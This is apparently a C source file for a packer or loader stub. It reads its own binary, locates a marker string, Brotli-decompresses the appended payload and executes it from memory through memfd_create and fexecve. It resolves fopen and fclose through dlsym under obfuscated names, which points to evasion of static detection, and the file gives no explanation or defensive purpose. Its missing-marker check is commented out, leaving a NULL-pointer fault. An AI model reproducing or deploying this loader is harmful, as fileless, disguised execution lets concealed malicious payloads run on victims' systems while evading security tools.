#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <brotli/decode.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/syscall.h>
#include <dlfcn.h>

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

typedef FILE *(*abcd_type)(const char *, const char *);
typedef int (*efgh_type)(FILE *);

abcd_type abcd = NULL;
efgh_type efgh = NULL;

int my_memfd_create(const char *name, unsigned int flags)
{
    return syscall(SYS_memfd_create, name, flags);
}

#define MARKER "==Ws in the chat=="

unsigned char *reverse_memmem(const unsigned char *haystack, size_t haystack_len,
                              const unsigned char *needle, size_t needle_len)
{
    if (needle_len == 0 || haystack_len < needle_len)
        return NULL;
    for (ssize_t i = haystack_len - needle_len; i >= 0; i--)
    {
        if (memcmp(haystack + i, needle, needle_len) == 0)
            return (unsigned char *)(haystack + i);
    }
    return NULL;
}

int main(int argc, char *argv[], char *envp[])
{

    void *handle = dlopen("libc.so.6", RTLD_LAZY);
    if (!handle)
    {
        return EXIT_FAILURE;
    }

    abcd = (abcd_type)dlsym(handle, "fopen");
    if (!abcd)
    {
        dlclose(handle);
        return EXIT_FAILURE;
    }

    efgh = (efgh_type)dlsym(handle, "fclose");
    if (!efgh)
    {
        dlclose(handle);
        return EXIT_FAILURE;
    }
    FILE *self = abcd(argv[0], "rb");
    if (!self)
    {
        return EXIT_FAILURE;
    }

    fseek(self, 0, SEEK_END);
    long filesize = ftell(self);
    rewind(self);

    unsigned char *filedata = malloc(filesize);
    if (!filedata)
    {
        efgh(self);
        return EXIT_FAILURE;
    }
    if (fread(filedata, 1, filesize, self) != (size_t)filesize)
    {
        free(filedata);
        efgh(self);
        return EXIT_FAILURE;
    }
    efgh(self);

    unsigned char *marker = reverse_memmem(filedata, filesize,
                                           (unsigned char *)MARKER, strlen(MARKER));
    // if (!marker)
    // {
    //     free(filedata);
    //     return EXIT_FAILURE;
    // }

    size_t marker_len = strlen(MARKER);
    unsigned char *payload = marker + marker_len;
    size_t payload_size = filesize - (payload - filedata);

    size_t max_decompressed_size = 1024 * 1024;
    unsigned char *decompressed = malloc(max_decompressed_size);
    if (!decompressed)
    {
        free(filedata);
        return EXIT_FAILURE;
    }

    size_t decompressed_size = max_decompressed_size;
    BrotliDecoderResult res = BrotliDecoderDecompress(payload_size, payload,
                                                      &decompressed_size, decompressed);
    if (res != BROTLI_DECODER_RESULT_SUCCESS)
    //////
    {
        free(filedata);
        free(decompressed);
        return EXIT_FAILURE;
    }

    free(filedata);

    int fd = my_memfd_create("decompressed", MFD_CLOEXEC);
    if (fd == -1)
    {
        free(decompressed);
        return EXIT_FAILURE;
    }

    ssize_t written = write(fd, decompressed, decompressed_size);
    if (written != decompressed_size)
    {
        free(decompressed);
        close(fd);
        return EXIT_FAILURE;
    }
    free(decompressed);

    lseek(fd, 0, SEEK_SET);

    char *new_argv[] = {argv[0], NULL};

    if (fexecve(fd, new_argv, envp) == -1)
    {
        close(fd);
        return EXIT_FAILURE;
    }

    close(fd);
    return 0;
}
